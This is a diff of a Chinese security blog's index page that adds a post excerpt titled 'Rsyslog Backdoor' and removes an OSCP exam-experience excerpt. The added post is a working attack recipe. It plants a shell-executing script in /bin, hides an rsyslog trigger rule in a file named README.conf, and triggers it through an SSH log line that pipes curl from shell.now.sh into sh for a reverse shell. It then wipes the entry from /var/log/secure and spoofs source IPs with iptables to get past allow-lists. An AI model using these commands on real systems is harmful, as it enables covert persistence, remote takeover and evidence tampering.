@@ -117,6 +117,80 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2019/07/21/rsyslog-backdoor.html" >Rsyslog Backdoor</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2019-07-21  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>Centos自带rsyslog，网上有具体利用过程，这里我记录下简单的坑。</p>
+<h3 id="建立后门"><a href="#建立后门" class="headerlink" title="建立后门"></a>建立后门</h3><pre class="line-numbers language-none"><code class="language-none">echo -e &#39;#!&#x2F;bin&#x2F;sh\nsh -c &quot;$1&quot;&#39;&gt;&#x2F;bin&#x2F;atg
+chmod 755 &#x2F;bin&#x2F;atg
+
+echo &quot;auth.*,regex, abcd  ^&#x2F;bin&#x2F;atg&quot; &gt; &#x2F;etc&#x2F;rsyslog.d&#x2F;README.conf
+
+重启生效(Centos用下面的systemctl):
+&#x2F;etc&#x2F;init.d&#x2F;rsyslog restart
+systemctl restart rsyslog
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用:"></a>利用:</h3><pre class="line-numbers language-none"><code class="language-none">echo &quot;xxxxx&#39;;curl https:&#x2F;&#x2F;shell.now.sh&#x2F;127.0.0.1:1337 | sh;&#39;&quot;|socat STDIO TCP4:127.0.0.1:22<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="擦屁股"><a href="#擦屁股" class="headerlink" title="擦屁股:"></a>擦屁股:</h3><pre class="line-numbers language-none"><code class="language-none">sed -i &#39;&#x2F;xxxxx&#x2F;d&#39; &#x2F;var&#x2F;log&#x2F;secure
+kill -9 $$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p>如果主机设定了<code>hosts.allow</code>的情况下，利用的那一部分是无法成功的，因为这个ssh的日志不会被记录。所以咧我们可以利用iptables. :)</p>
+<pre class="line-numbers language-none"><code class="language-none">iptables -t nat -A INPUT -p tcp -d &lt;受害主机&gt; --dport 22 -s &lt;攻击主机&gt; -j SNAT --to-source &lt;ip白名单的地址&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+	
+
+	</div>
+  <a type="button" href="/2019/07/21/rsyslog-backdoor.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>Centos自带rsyslog，网上有具体利用过程，这里我记录下简单的坑。</p>
+<h3 id="建立后门"><a href="#建立后门" class="headerlink" title="建立后门"></a>建立后门</h3><pre class="line-numbers language-none"><code class="language-none">echo -e &#39;#!&#x2F;bin&#x2F;sh\nsh -c &quot;$1&quot;&#39;&gt;&#x2F;bin&#x2F;atg
+chmod 755 &#x2F;bin&#x2F;atg
+
+echo &quot;auth.*,regex, abcd  ^&#x2F;bin&#x2F;atg&quot; &gt; &#x2F;etc&#x2F;rsyslog.d&#x2F;README.conf
+
+重启生效(Centos用下面的systemctl):
+&#x2F;etc&#x2F;init.d&#x2F;rsyslog restart
+systemctl restart rsyslog
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用:"></a>利用:</h3><pre class="line-numbers language-none"><code class="language-none">echo &quot;xxxxx&#39;;curl https:&#x2F;&#x2F;shell.now.sh&#x2F;127.0.0.1:1337 | sh;&#39;&quot;|socat STDIO TCP4:127.0.0.1:22<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="擦屁股"><a href="#擦屁股" class="headerlink" title="擦屁股:"></a>擦屁股:</h3><pre class="line-numbers language-none"><code class="language-none">sed -i &#39;&#x2F;xxxxx&#x2F;d&#39; &#x2F;var&#x2F;log&#x2F;secure
+kill -9 $$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p>如果主机设定了<code>hosts.allow</code>的情况下，利用的那一部分是无法成功的，因为这个ssh的日志不会被记录。所以咧我们可以利用iptables. :)</p>
+<pre class="line-numbers language-none"><code class="language-none">iptables -t nat -A INPUT -p tcp -d &lt;受害主机&gt; --dport 22 -s &lt;攻击主机&gt; -j SNAT --to-source &lt;ip白名单的地址&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+	
+	</div>
+  <a type="button" href="/2019/07/21/rsyslog-backdoor.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2019/06/24/tmux.html" >tmux使用</a>
 		</h3>
 		</div>
@@ -397,76 +471,6 @@ plugin &#x3D; socks5<span aria-hidden="true" class="line-numbers-rows"><span></s
 </div>
 
 		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2019/04/02/OSCP-experience.html" >OSCP经验</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2019-04-02  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<h2 id="0x01-网络问题"><a href="#0x01-网络问题" class="headerlink" title="0x01: 网络问题"></a>0x01: 网络问题</h2><pre class="line-numbers language-none"><code class="language-none">socks-proxy 127.0.0.1 6876
-uth-user-pass auth.txt
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p>在openvpn的配置文件里面，我加了上面两行。<br>第一行因为国内网络不稳定，我加了ss的代理，后来换成了v2ray.<br>第二行是理由同上，因为网络不稳定，每次连接VPN都要输入用户密码，这样方便点.</p>
-<p>具体网络不稳定有两个表现:</p>
-<ol>
-<li>nmap扫描全部的端口长时间没有反应.</li>
-<li>dirbuster扫描的时候会卡死进行不下去了.</li>
-</ol>
-<p>上面两个问题有两个解决方法:</p>
-<ol>
-<li>nmap换成<a target="_blank" rel="noopener" href="https://github.com/AnthraX1/InsightScan">https://github.com/AnthraX1/InsightScan</a>, 先用单文件扫描全部的开放端口，然后用nmap扫描开放端口服务: <code>nmap -sS -sV -sC &lt;IP&gt; -p &lt;PORT&gt;</code></li>
-<li>dirbuster换成gobuster，词典不变，线程控制在25个左右.</li>
-</ol>
-<h2 id="0x02-报告问题"><a href="#0x02-报告问题" class="headerlink" title="0x02: 报告问题"></a>0x02: 报告问题</h2><p>我的报告格式和下面这个人的差不多。如果可以尽量使用官方的模版就用官方的模版，不然容易凉，我写了50多页的报告，做了4道半题目。<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaoxiaoleo/p/9040339.html">https://www.cnblogs.com/xiaoxiaoleo/p/9040339.html</a></p>
-<h2 id="0x03-监考问题"><a href="#0x03-监考问题" class="headerlink" title="0x03: 监考问题"></a>0x03: 监考问题</h2>
-	
-
-	</div>
-  <a type="button" href="/2019/04/02/OSCP-experience.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<h2 id="0x01-网络问题"><a href="#0x01-网络问题" class="headerlink" title="0x01: 网络问题"></a>0x01: 网络问题</h2><pre class="line-numbers language-none"><code class="language-none">socks-proxy 127.0.0.1 6876
-uth-user-pass auth.txt
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p>在openvpn的配置文件里面，我加了上面两行。<br>第一行因为国内网络不稳定，我加了ss的代理，后来换成了v2ray.<br>第二行是理由同上，因为网络不稳定，每次连接VPN都要输入用户密码，这样方便点.</p>
-<p>具体网络不稳定有两个表现:</p>
-<ol>
-<li>nmap扫描全部的端口长时间没有反应.</li>
-<li>dirbuster扫描的时候会卡死进行不下去了.</li>
-</ol>
-<p>上面两个问题有两个解决方法:</p>
-<ol>
-<li>nmap换成<a target="_blank" rel="noopener" href="https://github.com/AnthraX1/InsightScan">https://github.com/AnthraX1/InsightScan</a>, 先用单文件扫描全部的开放端口，然后用nmap扫描开放端口服务: <code>nmap -sS -sV -sC &lt;IP&gt; -p &lt;PORT&gt;</code></li>
-<li>dirbuster换成gobuster，词典不变，线程控制在25个左右.</li>
-</ol>
-<h2 id="0x02-报告问题"><a href="#0x02-报告问题" class="headerlink" title="0x02: 报告问题"></a>0x02: 报告问题</h2><p>我的报告格式和下面这个人的差不多。如果可以尽量使用官方的模版就用官方的模版，不然容易凉，我写了50多页的报告，做了4道半题目。<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaoxiaoleo/p/9040339.html">https://www.cnblogs.com/xiaoxiaoleo/p/9040339.html</a></p>
-<h2 id="0x03-监考问题"><a href="#0x03-监考问题" class="headerlink" title="0x03: 监考问题"></a>0x03: 监考问题</h2>
-	
-	</div>
-  <a type="button" href="/2019/04/02/OSCP-experience.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -524,7 +528,7 @@ uth-user-pass auth.txt
 		
 			<li><a href="/categories/PWN/">PWN<span>2</span></a></li>
 		
-			<li><a href="/categories/Pentest/">Pentest<span>51</span></a></li>
+			<li><a href="/categories/Pentest/">Pentest<span>52</span></a></li>
 		
 			<li><a href="/categories/Python/">Python<span>5</span></a></li>
 		
@@ -545,6 +549,10 @@ uth-user-pass auth.txt
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2023/04/23/sandbox-info-collect.html" ><i class="fa fa-file-o"></i>沙盒环境信息收集</a>
+      </li>
+    
+      <li>
         <a href="/2023/04/20/BrokenSesame-Alibaba-Cloud-Database-Services-RCE.html" ><i class="fa fa-file-o"></i>BrokenSesame-阿里云数据库远程命令执行</a>
       </li>
     
@@ -558,10 +566,6 @@ uth-user-pass auth.txt
     
       <li>
         <a href="/2023/02/14/kafka-rce.html" ><i class="fa fa-file-o"></i>Apache Kafka Connect JNDI注入...</a>
-      </li>
-    
-      <li>
-        <a href="/2023/02/13/cname-hijack-openresty.html" ><i class="fa fa-file-o"></i>利用OpenResty进行域名流量劫持</a>
       </li>
     
   </ul>
